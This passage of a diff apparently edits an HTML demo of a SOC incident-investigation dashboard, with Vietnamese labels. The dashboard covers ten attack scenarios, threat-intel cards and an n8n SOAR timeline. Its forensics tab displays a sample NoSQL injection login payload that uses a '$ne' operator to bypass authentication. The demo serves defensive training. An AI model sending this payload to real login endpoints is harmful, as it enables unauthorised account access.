@@ -3,7 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SOC Investigation Demo - 10 Kịch Bản Đầy Đủ (Chuẩn Theme Hệ Thống)</title>
+  <title>SOC Investigation Demo - 10 Kịch Bản Chuẩn Hóa</title>
+  <!-- Google Fonts Inter & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
     tailwind.config = {
@@ -11,12 +15,13 @@
       theme: {
         extend: {
           fontFamily: {
-            sans: ['Inter', 'system-ui', 'sans-serif'],
+            sans: ['Inter', 'system-ui', '-apple-system', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
           },
           colors: {
             darkBg: '#070b14',
-            darkCard: '#0f172a',
-            darkSubCard: '#090d16',
+            darkCard: '#0c1222',
+            darkSubCard: '#0f172a',
             darkBorder: '#1e293b'
           }
         }
@@ -26,7 +31,9 @@
   <!-- Lucide Icons -->
   <script src="https://unpkg.com/lucide@latest"></script>
   <style>
-    /* Custom Scrollbar đồng bộ với hệ thống chính */
+    body {
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    }
     .custom-scrollbar::-webkit-scrollbar {
       width: 5px;
       height: 5px;
@@ -35,57 +42,62 @@
       background: transparent;
     }
     .custom-scrollbar::-webkit-scrollbar-thumb {
-      background: rgba(148, 163, 184, 0.3);
+      background: rgba(148, 163, 184, 0.25);
       border-radius: 9999px;
     }
     .custom-scrollbar::-webkit-scrollbar-thumb:hover {
-      background: rgba(148, 163, 184, 0.5);
+      background: rgba(148, 163, 184, 0.45);
+    }
+    .tab-content {
+      margin-top: 0 !important;
     }
   </style>
 </head>
-<body class="bg-slate-100 dark:bg-[#070b14] text-slate-800 dark:text-slate-100 min-h-screen p-4 sm:p-6 transition-colors duration-300 font-sans flex flex-col items-center">
+<body class="bg-slate-100 dark:bg-[#070b14] text-slate-800 dark:text-slate-200 min-h-screen p-4 sm:p-6 transition-colors duration-300 font-sans flex flex-col items-center">
 
   <!-- TOP TOOLBAR: CHỌN KỊCH BẢN & TOGGLE THEME ĐỒNG BỘ CHƯƠNG TRÌNH -->
-  <div class="w-full max-w-5xl mb-4 flex flex-col sm:flex-row items-center justify-between gap-3 bg-white dark:bg-[#0f172a] p-3 rounded-2xl border border-slate-300 dark:border-slate-800 shadow-sm">
-    <div class="flex items-center gap-2.5 w-full sm:w-auto">
-      <div class="w-8 h-8 rounded-xl bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 flex items-center justify-center border border-cyan-500/20">
+  <div class="w-full max-w-5xl mb-4 flex flex-col sm:flex-row items-center justify-between gap-3 bg-white dark:bg-[#0c1222] p-3 rounded-2xl border border-slate-200 dark:border-slate-800 shadow-sm">
+    <div class="flex items-center gap-3 w-full sm:w-auto">
+      <div class="w-8 h-8 rounded-xl bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 flex items-center justify-center border border-cyan-500/20 shrink-0">
         <i data-lucide="layers" class="w-4 h-4"></i>
       </div>
       <div class="flex-1 sm:flex-none">
-        <label class="text-[11px] font-bold text-slate-500 dark:text-slate-400 block">KỊCH BẢN TRÌNH DIỄN (10/10):</label>
-        <select id="scenarioSelect" onchange="loadScenario(this.value)" class="bg-slate-50 dark:bg-[#070b14] border border-slate-300 dark:border-slate-700 text-xs font-bold rounded-xl px-3 py-1.5 text-slate-800 dark:text-slate-200 outline-none focus:border-cyan-500 cursor-pointer">
-          <!-- 10 Playbooks -->
-          <option value="0">1. Phishing Email (Email lừa đảo)</option>
-          <option value="1">2. Brute Force Attack (Dò mật khẩu)</option>
-          <option value="2">3. Malware Detection (Mã độc máy trạm)</option>
-          <option value="3">4. Suspicious Login (Đăng nhập bất thường)</option>
-          <option value="4">5. Port Scan Detection (Rà quét cổng mạng)</option>
-          <option value="5" selected>6. NoSQL Injection (Tiêm nhiễm cơ sở dữ liệu)</option>
-          <option value="6">7. Cross-Site Scripting (XSS giao diện)</option>
-          <option value="7">8. Insecure Direct Object (IDOR vượt quyền)</option>
-          <option value="8">9. Credential Stuffing (Nhồi nhét combo lộ lọt)</option>
-          <option value="9">10. Server-Side Request Forgery (SSRF máy chủ)</option>
+        <label class="text-[10px] font-bold uppercase tracking-wider text-slate-400 dark:text-slate-500 block mb-0.5">Kịch Bản Điều Tra Sự Cố (10 Kịch Bản):</label>
+        <select id="scenarioSelect" onchange="loadScenario(parseInt(this.value, 10))" class="bg-slate-50 dark:bg-[#070b14] border border-slate-200 dark:border-slate-700/80 text-xs font-semibold rounded-xl px-3 py-1.5 text-slate-800 dark:text-slate-200 outline-none focus:border-cyan-500 cursor-pointer w-full sm:w-auto">
+          <!-- 10 Playbooks matching mockGenerator.js -->
+          <option value="0">1. Phishing Email (VirusTotal API)</option>
+          <option value="1">2. Brute Force Attack (Giám sát ngưỡng đăng nhập)</option>
+          <option value="2">3. Malware Detection (EDR Host Isolation)</option>
+          <option value="3">4. Suspicious Login (Geo-Velocity Anomaly)</option>
+          <option value="4">5. Port Scan Detection (AbuseIPDB Threat Intel)</option>
+          <option value="5" selected>6. NoSQL Injection Detection (WAF & AbuseIPDB)</option>
+          <option value="6">7. Cross-Site Scripting (XSS DOMPurify)</option>
+          <option value="7">8. Insecure Direct Object Reference (IDOR / RBAC)</option>
+          <option value="8">9. Credential Stuffing (Rate Limit & Captcha)</option>
+          <option value="9">10. Server-Side Request Forgery (SSRF Metadata Guard)</option>
         </select>
       </div>
     </div>
 
-    <!-- Toggle Theme (Sáng / Tối đồng bộ đúng màu hệ thống) -->
-    <div class="flex items-center gap-2">
-      <button onclick="toggleTheme()" class="px-3.5 py-1.5 rounded-xl border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-[#070b14] text-xs font-bold text-slate-700 dark:text-slate-300 hover:bg-slate-200/60 dark:hover:bg-slate-800 transition flex items-center gap-1.5 cursor-pointer">
-        <i id="themeIcon" data-lucide="sun" class="w-4 h-4 text-amber-500"></i>
-        <span id="themeText">Đổi Giao Diện Sáng/Tối</span>
+    <!-- Toggle Theme (Sáng / Tối đồng bộ màu hệ thống) -->
+    <div class="flex items-center gap-2 self-end sm:self-auto">
+      <button onclick="toggleTheme()" class="px-3.5 py-1.5 rounded-xl border border-slate-200 dark:border-slate-700/80 bg-slate-50 dark:bg-[#070b14] text-xs font-semibold text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition flex items-center gap-2 cursor-pointer shadow-sm">
+        <span id="themeIconBox" class="flex items-center">
+          <i data-lucide="sun" class="w-4 h-4 text-amber-500"></i>
+        </span>
+        <span id="themeText">Giao Diện: Tối</span>
       </button>
     </div>
   </div>
 
-  <!-- MODAL CONTAINER (CHUẨN FORM THEME HỆ THỐNG: BORDER-SLATE-300 / BORDER-SLATE-800) -->
-  <div class="w-full max-w-5xl bg-white dark:bg-[#0f172a] border border-slate-300 dark:border-slate-800 rounded-2xl shadow-2xl flex flex-col overflow-hidden text-xs transition-colors duration-300">
+  <!-- MODAL CONTAINER (CHUẨN FORM THEME HỆ THỐNG: BORDER-SLATE-200 / BORDER-SLATE-800) -->
+  <div class="w-full max-w-5xl bg-white dark:bg-[#0c1222] border border-slate-200 dark:border-slate-800 rounded-2xl shadow-xl flex flex-col overflow-hidden text-xs transition-colors duration-300">
     
     <!-- 1. HEADER BANNER CHUẨN FORM CHƯƠNG TRÌNH -->
-    <div class="px-6 py-4 border-b border-slate-300 dark:border-slate-800 flex items-center justify-between bg-slate-50/70 dark:bg-[#070b14]/50 shrink-0">
-      <div class="flex items-center gap-3">
-        <div id="typeIconBox" class="w-10 h-10 rounded-xl bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20 flex items-center justify-center font-bold">
-          <i id="typeIcon" data-lucide="shield-alert" class="w-5 h-5"></i>
+    <div class="px-6 py-4 border-b border-slate-200 dark:border-slate-800 flex items-center justify-between bg-slate-50/60 dark:bg-[#070b14]/50 shrink-0">
+      <div class="flex items-center gap-3.5">
+        <div id="typeIconBox" class="w-10 h-10 rounded-xl bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20 flex items-center justify-center font-bold shrink-0">
+          <i data-lucide="shield-alert" class="w-5 h-5"></i>
         </div>
         <div>
           <div class="flex items-center gap-2 flex-wrap">
@@ -93,12 +105,15 @@
             <span id="severityBadge" class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20">
               CRITICAL
             </span>
-            <span id="mitreBadge" class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-indigo-500/10 text-indigo-600 dark:text-indigo-400 border border-indigo-500/20">
-              MITRE T1190
+            <span id="playbookBadge" class="px-2 py-0.5 rounded text-[10px] font-mono font-medium bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 border border-cyan-500/20">
+              Playbook #6
             </span>
           </div>
-          <p class="text-[11px] text-slate-500 dark:text-slate-400 font-mono mt-0.5">
-            Mã sự cố: <span id="incidentId" class="text-slate-800 dark:text-slate-200 font-bold">897ba289-42b1-4876-9ec1-197e6e5a401c</span> • Phát hiện: 11:24:05 - 29/09/2026
+          <p id="scenarioSubTitle" class="text-[11px] text-cyan-600 dark:text-cyan-400 font-semibold mt-0.5">
+            Cảnh báo Tấn công tiêm nhiễm CSDL (NoSQL Injection)
+          </p>
+          <p class="text-[10px] text-slate-500 dark:text-slate-400 font-mono mt-0.5">
+            Mã sự cố: <span id="incidentId" class="text-slate-700 dark:text-slate-300 font-semibold">897ba289-42b1-4876-9ec1-197e6e5a401c</span> • Phát hiện: <span id="incidentTime">11:24:05 - 29/09/2026</span>
           </p>
         </div>
       </div>
@@ -108,137 +123,144 @@
           <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
           Resolved (#soar-done)
         </span>
-        <button class="p-1.5 rounded-xl border border-slate-300 dark:border-slate-700 hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-500 transition cursor-pointer">
+        <button onclick="closeModal()" title="Đóng modal" class="p-1.5 rounded-xl border border-slate-200 dark:border-slate-700/80 hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-500 transition cursor-pointer">
           <i data-lucide="x" class="w-4 h-4"></i>
         </button>
       </div>
     </div>
 
-    <!-- 2. QUICK METRIC STAT STRIP (DẢI THÔNG SỐ CHUẨN XÁC) -->
-    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 px-6 py-3 bg-slate-50 dark:bg-[#070b14]/70 border-b border-slate-300 dark:border-slate-800 text-[11px] shrink-0">
+    <!-- 2. QUICK METRIC STAT STRIP (DẢI THÔNG SỐ CHÍNH) -->
+    <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 px-6 py-3 bg-slate-50 dark:bg-[#070b14]/70 border-b border-slate-200 dark:border-slate-800 text-[11px] shrink-0">
       <div>
-        <span class="text-slate-500 dark:text-slate-400 block font-medium">Nguồn Gốc (Attacker):</span>
+        <span class="text-slate-400 dark:text-slate-500 block font-medium">Nguồn Gốc (Attacker):</span>
         <span id="statSource" class="font-mono font-bold text-rose-600 dark:text-rose-400">217.245.12.30</span>
       </div>
       <div>
-        <span class="text-slate-500 dark:text-slate-400 block font-medium">Mục Tiêu (Asset Target):</span>
-        <span id="statTarget" class="font-mono font-bold text-cyan-600 dark:text-cyan-400">10.0.0.15 (Auth API Service)</span>
+        <span class="text-slate-400 dark:text-slate-500 block font-medium">Mục Tiêu (Asset Target):</span>
+        <span id="statTarget" class="font-mono font-semibold text-cyan-600 dark:text-cyan-400">10.0.0.15 (Auth API)</span>
       </div>
       <div>
-        <span class="text-slate-500 dark:text-slate-400 block font-medium">Vị Trí & Hạ Tầng:</span>
-        <span id="statGeo" class="font-semibold text-slate-700 dark:text-slate-200">Moscow, Russia (Tor Node)</span>
+        <span class="text-slate-400 dark:text-slate-500 block font-medium">Vị Trí & Hạ Tầng:</span>
+        <span id="statGeo" class="font-semibold text-slate-700 dark:text-slate-300">Moscow, Russia (Tor Node)</span>
       </div>
       <div>
-        <span class="text-slate-500 dark:text-slate-400 block font-medium">Tình Báo Điểm Đe Dọa:</span>
+        <span class="text-slate-400 dark:text-slate-500 block font-medium">Chỉ Số Tình Báo / Rủi Ro:</span>
         <span id="statScore" class="font-bold text-rose-600 dark:text-rose-400">96% Malicious (AbuseIPDB)</span>
       </div>
     </div>
 
-    <!-- 3. NAVIGATION TABS (ĐỒNG BỘ GIAO DIỆN) -->
-    <div class="flex items-center gap-1 px-6 border-b border-slate-300 dark:border-slate-800 bg-white dark:bg-[#0f172a] shrink-0">
-      <button onclick="switchTab('tab1')" id="btn-tab1" class="tab-btn px-4 py-3 font-bold border-b-2 border-cyan-500 text-cyan-600 dark:text-cyan-400 flex items-center gap-2 transition cursor-pointer">
-        <i data-lucide="activity" class="w-3.5 h-3.5"></i>
-        <span>1. Tình Báo Mối Đe Dọa (Threat Intel)</span>
+    <!-- 3. NAVIGATION TABS (3 TAB ĐỒNG BỘ KÍCH THƯỚC, KHOẢNG CÁCH CHUẨN GỌN GÀNG) -->
+    <div class="flex items-center gap-2 px-6 border-b border-slate-200 dark:border-slate-800 bg-white dark:bg-[#0c1222] shrink-0 pt-1">
+      <button onclick="switchTab('tab1')" id="btn-tab1" class="tab-btn flex-1 max-w-[290px] h-11 font-bold border-b-2 border-cyan-500 text-cyan-600 dark:text-cyan-400 flex items-center justify-center gap-2 transition cursor-pointer px-4 text-xs bg-cyan-500/5 dark:bg-cyan-500/10 rounded-t-xl">
+        <i data-lucide="activity" class="w-3.5 h-3.5 shrink-0"></i>
+        <span class="truncate">1. Tình Báo Đe Dọa (Enrichment)</span>
       </button>
-      <button onclick="switchTab('tab2')" id="btn-tab2" class="tab-btn px-4 py-3 font-semibold border-b-2 border-transparent text-slate-500 dark:text-slate-400 hover:text-slate-800 dark:hover:text-slate-200 flex items-center gap-2 transition cursor-pointer">
-        <i data-lucide="file-code" class="w-3.5 h-3.5"></i>
-        <span>2. Bằng Chứng Kỹ Thuật (Forensics)</span>
+      <button onclick="switchTab('tab2')" id="btn-tab2" class="tab-btn flex-1 max-w-[290px] h-11 font-semibold border-b-2 border-transparent text-slate-500 dark:text-slate-400 hover:text-slate-800 dark:hover:text-slate-200 flex items-center justify-center gap-2 transition cursor-pointer px-4 text-xs hover:bg-slate-100 dark:hover:bg-slate-800/50 rounded-t-xl">
+        <i data-lucide="file-code" class="w-3.5 h-3.5 shrink-0"></i>
+        <span class="truncate">2. Bằng Chứng Kỹ Thuật (Forensics)</span>
       </button>
-      <button onclick="switchTab('tab3')" id="btn-tab3" class="tab-btn px-4 py-3 font-semibold border-b-2 border-transparent text-slate-500 dark:text-slate-400 hover:text-slate-800 dark:hover:text-slate-200 flex items-center gap-2 transition cursor-pointer">
-        <i data-lucide="git-merge" class="w-3.5 h-3.5"></i>
-        <span>3. Tiến Trình n8n SOAR & Thẩm Định</span>
+      <button onclick="switchTab('tab3')" id="btn-tab3" class="tab-btn flex-1 max-w-[290px] h-11 font-semibold border-b-2 border-transparent text-slate-500 dark:text-slate-400 hover:text-slate-800 dark:hover:text-slate-200 flex items-center justify-center gap-2 transition cursor-pointer px-4 text-xs hover:bg-slate-100 dark:hover:bg-slate-800/50 rounded-t-xl">
+        <i data-lucide="git-merge" class="w-3.5 h-3.5 shrink-0"></i>
+        <span class="truncate">3. Tiến Trình Điều Phối (SOAR)</span>
       </button>
     </div>
 
-    <!-- 4. TAB CONTENTS (CUỘN RIÊNG) -->
-    <div class="p-6 overflow-y-auto max-h-[58vh] custom-scrollbar space-y-4 bg-slate-50/40 dark:bg-[#070b14]/30">
+    <!-- 4. TAB CONTENTS (LOẠI BỎ space-y-4 ĐỂ TRÁNH ĐẨY MARGIN-TOP CỦA TAB 2 VÀ TAB 3) -->
+    <div id="tabContents" class="p-6 overflow-y-auto min-h-[420px] max-h-[58vh] custom-scrollbar bg-slate-50/50 dark:bg-[#070b14]/40">
       
-      <!-- TAB 1: THREAT INTELLIGENCE (TỰ ĐỘNG BIẾN ĐỔI THEO KỊCH BẢN) -->
-      <div id="tab1" class="tab-content space-y-4">
+      <!-- TAB 1: THREAT INTELLIGENCE & CONTEXT -->
+      <div id="tab1" class="tab-content space-y-4 !mt-0">
         
         <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-          <!-- Card 1: VirusTotal / Reputation Engine -->
-          <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-300 dark:border-slate-800 shadow-sm">
-            <div class="flex items-center justify-between mb-3">
-              <span class="font-bold text-slate-800 dark:text-slate-200 flex items-center gap-1.5 text-xs">
-                <i data-lucide="shield" class="w-4 h-4 text-cyan-600 dark:text-cyan-400"></i>
-                <span id="tiEngineName">VirusTotal Reputation Scanner</span>
-              </span>
-              <span id="tiVerdictBadge" class="px-2 py-0.5 rounded text-[10px] font-bold bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20">
-                MALICIOUS
-              </span>
-            </div>
-            <div class="flex items-center justify-between">
-              <div>
-                <div id="tiRatio" class="text-2xl font-black text-rose-600 dark:text-rose-400">18 / 72</div>
-                <div id="tiRatioDesc" class="text-[11px] text-slate-500 dark:text-slate-400 mt-0.5 font-medium">Antivirus engines gắn cờ độc hại</div>
+          <!-- Card 1: Dynamic Engine -->
+          <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-200 dark:border-slate-800/80 shadow-sm flex flex-col justify-between">
+            <div>
+              <div class="flex items-center justify-between mb-3">
+                <span class="font-bold text-slate-800 dark:text-slate-200 flex items-center gap-2 text-xs">
+                  <span id="tiIconBox" class="flex items-center">
+                    <i data-lucide="shield" class="w-4 h-4 text-cyan-600 dark:text-cyan-400"></i>
+                  </span>
+                  <span id="tiEngineName">VirusTotal Reputation Scanner</span>
+                </span>
+                <span id="tiVerdictBadge" class="px-2 py-0.5 rounded text-[10px] font-bold bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20">
+                  MALICIOUS
+                </span>
               </div>
-              <div id="tiPercentCircle" class="w-13 h-13 rounded-full border-4 border-rose-500/20 border-t-rose-500 flex items-center justify-center font-bold text-rose-600 dark:text-rose-400 text-xs">
-                25%
+              <div class="flex items-center justify-between mt-2">
+                <div>
+                  <div id="tiRatio" class="text-2xl font-black text-rose-600 dark:text-rose-400">14 / 72</div>
+                  <div id="tiRatioDesc" class="text-[11px] text-slate-500 dark:text-slate-400 mt-0.5 font-medium">Antivirus engines gắn cờ độc hại</div>
+                </div>
+                <div id="tiPercentCircle" class="w-12 h-12 rounded-full border-4 border-rose-500/20 border-t-rose-500 flex items-center justify-center font-bold text-rose-600 dark:text-rose-400 text-xs">
+                  25%
+                </div>
               </div>
             </div>
-            <div class="mt-3 pt-3 border-t border-slate-200 dark:border-slate-800 text-[11px] text-slate-600 dark:text-slate-400 space-y-1">
-              <div>• Phân loại: <span id="tiCategory" class="text-slate-800 dark:text-slate-200 font-semibold font-mono">Malicious Proxy / Botnet Scanner</span></div>
-              <div>• Tra cứu đối tượng: <span id="tiTargetQueried" class="text-cyan-600 dark:text-cyan-400 font-mono font-semibold">217.245.12.30</span></div>
+            
+            <div class="mt-4 pt-3 border-t border-slate-100 dark:border-slate-800 text-[11px] text-slate-600 dark:text-slate-400 space-y-1.5">
+              <div class="flex items-start justify-between gap-2">
+                <span class="text-slate-400 dark:text-slate-500 shrink-0">Phân loại đe dọa:</span>
+                <span id="tiCategory" class="text-slate-800 dark:text-slate-200 font-semibold font-mono text-right">Phishing Landing Page</span>
+              </div>
+              <div class="flex items-start justify-between gap-2">
+                <span class="text-slate-400 dark:text-slate-500 shrink-0">Đối tượng kiểm tra:</span>
+                <span id="tiTargetQueried" class="text-cyan-600 dark:text-cyan-400 font-mono font-semibold break-all text-right">http://secure-login-verify.com</span>
+              </div>
             </div>
           </div>
 
-          <!-- Card 2: GeoIP / Network Context -->
-          <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-300 dark:border-slate-800 shadow-sm">
-            <div class="flex items-center justify-between mb-3">
-              <span class="font-bold text-slate-800 dark:text-slate-200 flex items-center gap-1.5 text-xs">
-                <i data-lucide="globe" class="w-4 h-4 text-indigo-500"></i>
-                Bối Cảnh Mạng & Hạ Tầng (GeoIP)
-              </span>
-              <span id="geoBadge" class="px-2 py-0.5 rounded text-[10px] font-bold bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20">
-                EXTERNAL
-              </span>
+          <!-- Card 2: Bối Cảnh Mạng & Hạ Tầng -->
+          <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-200 dark:border-slate-800/80 shadow-sm flex flex-col justify-between">
+            <div>
+              <div class="flex items-center justify-between mb-3">
+                <span class="font-bold text-slate-800 dark:text-slate-200 flex items-center gap-2 text-xs">
+                  <i data-lucide="globe" class="w-4 h-4 text-indigo-500"></i>
+                  Bối Cảnh Mạng & Hạ Tầng (Network Context)
+                </span>
+                <span id="geoBadge" class="px-2 py-0.5 rounded text-[10px] font-bold bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20">
+                  EXTERNAL
+                </span>
+              </div>
+              <div class="space-y-2.5 text-[11px] mt-2">
+                <div class="flex justify-between items-center py-1 border-b border-slate-100 dark:border-slate-800/80">
+                  <span class="text-slate-400 dark:text-slate-500">Autonomous System (ASN):</span>
+                  <span id="geoAsn" class="font-mono text-slate-800 dark:text-slate-200 font-semibold">AS49505 (Hostkey B.V.)</span>
+                </div>
+                <div class="flex justify-between items-center py-1 border-b border-slate-100 dark:border-slate-800/80">
+                  <span class="text-slate-400 dark:text-slate-500">Loại kết nối mạng:</span>
+                  <span id="geoConnectionType" class="text-amber-600 dark:text-amber-400 font-semibold">Tor Exit Relay</span>
+                </div>
+                <div class="flex justify-between items-center py-1">
+                  <span class="text-slate-400 dark:text-slate-500">Tài nguyên bị nhắm tới:</span>
+                  <span id="geoInternalAsset" class="text-cyan-600 dark:text-cyan-400 font-semibold">Production Kubernetes</span>
+                </div>
+              </div>
             </div>
-            <div class="space-y-2 text-[11px]">
-              <div class="flex justify-between py-1 border-b border-slate-100 dark:border-slate-800/80">
-                <span class="text-slate-500 dark:text-slate-400">Autonomous System (ASN):</span>
-                <span id="geoAsn" class="font-mono text-slate-800 dark:text-slate-200 font-bold">AS49505 (Hostkey B.V.)</span>
-              </div>
-              <div class="flex justify-between py-1 border-b border-slate-100 dark:border-slate-800/80">
-                <span class="text-slate-500 dark:text-slate-400">Loại kết nối mạng:</span>
-                <span id="geoConnectionType" class="text-amber-600 dark:text-amber-400 font-semibold">Tor Exit Relay / Bulletproof Hosting</span>
-              </div>
-              <div class="flex justify-between py-1">
-                <span class="text-slate-500 dark:text-slate-400">Phân vùng nội bộ bị nhắm tới:</span>
-                <span id="geoInternalAsset" class="text-cyan-600 dark:text-cyan-400 font-semibold">Cụm Production Kubernetes (prod-api)</span>
-              </div>
+            
+            <div class="mt-4 pt-3 border-t border-slate-100 dark:border-slate-800 text-[11px] text-slate-500 dark:text-slate-400 flex items-center justify-between">
+              <span>Độ tin cậy nguồn tin:</span>
+              <span class="font-semibold text-emerald-600 dark:text-emerald-400 flex items-center gap-1">
+                <i data-lucide="check-circle-2" class="w-3.5 h-3.5"></i> Đã xác thực SOAR
+              </span>
             </div>
           </div>
         </div>
 
-        <!-- MITRE ATT&CK MAPPING BOX -->
-        <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-300 dark:border-slate-800 shadow-sm">
-          <h4 class="font-bold text-slate-800 dark:text-slate-200 mb-2 flex items-center gap-1.5 text-xs">
-            <i data-lucide="crosshair" class="w-4 h-4 text-emerald-600 dark:text-emerald-400"></i>
-            Ánh Xạ Chuẩn Quốc Tế: MITRE ATT&CK Framework
-          </h4>
-          <div class="grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-[11px]">
-            <div class="bg-slate-50 dark:bg-[#070b14] p-3 rounded-xl border border-slate-200 dark:border-slate-800">
-              <span class="text-slate-500 dark:text-slate-400 text-[10px] block font-medium">Giai đoạn tấn công (Tactic):</span>
-              <span id="mitreTactic" class="font-bold text-cyan-600 dark:text-cyan-400">Initial Access (Truy cập ban đầu)</span>
-            </div>
-            <div class="bg-slate-50 dark:bg-[#070b14] p-3 rounded-xl border border-slate-200 dark:border-slate-800">
-              <span class="text-slate-500 dark:text-slate-400 text-[10px] block font-medium">Kỹ thuật định danh (Technique):</span>
-              <span id="mitreTechnique" class="font-bold text-slate-800 dark:text-slate-200">T1190 - Exploit Public-Facing App</span>
-            </div>
-            <div class="bg-slate-50 dark:bg-[#070b14] p-3 rounded-xl border border-slate-200 dark:border-slate-800">
-              <span class="text-slate-500 dark:text-slate-400 text-[10px] block font-medium">Cơ chế bắt giữ (Detection):</span>
-              <span id="mitreDetection" class="font-bold text-emerald-600 dark:text-emerald-400">WAF Signature: Mongo $gt Rule</span>
-            </div>
+        <!-- THÔNG BÁO TÓM TẮT ĐIỀU PHỐI TỰ ĐỘNG -->
+        <div class="p-3.5 rounded-xl bg-cyan-50/70 dark:bg-cyan-950/20 border border-cyan-200 dark:border-cyan-900/50 flex items-start gap-3 text-[11px]">
+          <i data-lucide="info" class="w-4 h-4 text-cyan-600 dark:text-cyan-400 shrink-0 mt-0.5"></i>
+          <div class="text-slate-600 dark:text-slate-300">
+            <span class="font-bold text-cyan-700 dark:text-cyan-300">Cơ chế làm giàu dữ liệu SOAR:</span>
+            Dữ liệu trên được trích xuất trực tiếp qua luồng n8n webhook hoặc thông tin trinh sát mạng. Các kịch bản sử dụng dịch vụ tương ứng (VirusTotal cho Phishing, AbuseIPDB cho Port Scan/NoSQLi, EDR và Giám sát Rule cho các kịch bản còn lại).
           </div>
         </div>
 
       </div>
 
-      <!-- TAB 2: FORENSIC EVIDENCE (BẰNG CHỨNG BIẾN ĐỔI CHÍNH XÁC THEO 10 KỊCH BẢN) -->
-      <div id="tab2" class="tab-content hidden space-y-4">
+      <!-- TAB 2: FORENSIC EVIDENCE -->
+      <div id="tab2" class="tab-content hidden space-y-4 !mt-0">
         
-        <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-300 dark:border-slate-800 shadow-sm">
+        <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-200 dark:border-slate-800/80 shadow-sm">
           <h4 class="font-bold text-slate-800 dark:text-slate-200 mb-1 flex items-center gap-1.5 text-xs">
             <i data-lucide="terminal" class="w-4 h-4 text-rose-500"></i>
             <span id="forensicTitle">Đoạn Mã Độc Hại Trích Xuất (Attack Payload)</span>
@@ -246,20 +268,20 @@
           <p id="forensicDesc" class="text-[11px] text-slate-500 dark:text-slate-400 mb-3">
             Kẻ tấn công sử dụng toán tử Mongo nhằm vượt qua cơ chế xác thực.
           </p>
-          <div id="forensicHighlightBox" class="bg-slate-900 text-rose-400 p-3 rounded-xl border border-slate-800 font-mono text-xs font-bold leading-relaxed overflow-x-auto">
+          <div id="forensicHighlightBox" class="bg-slate-900 text-rose-400 p-3.5 rounded-xl border border-slate-800 font-mono text-xs font-semibold leading-relaxed overflow-x-auto">
             POST /api/v1/auth/login HTTP/1.1<br>
             Body: {"username": "admin", "password": {"$ne": null}}
           </div>
         </div>
 
-        <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-300 dark:border-slate-800 shadow-sm">
+        <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-200 dark:border-slate-800/80 shadow-sm">
           <div class="flex items-center justify-between mb-2">
-            <span class="font-bold text-slate-800 dark:text-slate-200 text-xs">Toàn bộ Raw JSON Payload trong Cơ sở dữ liệu</span>
+            <span class="font-bold text-slate-800 dark:text-slate-200 text-xs">Raw JSON Payload trong Cơ sở dữ liệu</span>
             <button onclick="copyRawJson()" class="text-cyan-600 dark:text-cyan-400 hover:underline flex items-center gap-1 text-[11px] font-semibold cursor-pointer">
               <i data-lucide="copy" class="w-3 h-3"></i> Sao chép JSON
             </button>
           </div>
-          <pre id="rawJsonBox" class="bg-slate-950 text-emerald-400 p-4 rounded-xl font-mono text-[11px] overflow-x-auto border border-slate-800 max-h-48 custom-scrollbar">
+          <pre id="rawJsonBox" class="bg-[#060a12] text-emerald-400 p-4 rounded-xl font-mono text-[11px] overflow-x-auto border border-slate-800 max-h-48 custom-scrollbar">
 {
   "event_type": "NoSQL_Injection",
   "source_ip": "217.245.12.30"
@@ -269,526 +291,683 @@
       </div>
 
       <!-- TAB 3: SOAR ACTIONS & VERDICT -->
-      <div id="tab3" class="tab-content hidden space-y-4">
+      <div id="tab3" class="tab-content hidden space-y-4 !mt-0">
         
         <!-- TIMELINE N8N -->
-        <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-300 dark:border-slate-800 shadow-sm">
+        <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-200 dark:border-slate-800/80 shadow-sm">
           <h4 class="font-bold text-slate-800 dark:text-slate-200 mb-3 flex items-center gap-1.5 text-xs">
             <i data-lucide="cpu" class="w-4 h-4 text-cyan-600 dark:text-cyan-400"></i>
             Tiến Trình Tự Động Hóa n8n Playbook
           </h4>
-          <div id="soarTimeline" class="space-y-3 pl-2 border-l-2 border-slate-300 dark:border-slate-700">
+          <div id="soarTimeline" class="space-y-3.5 pl-2 border-l-2 border-slate-200 dark:border-slate-800">
             <!-- Dynamic Steps -->
           </div>
         </div>
 
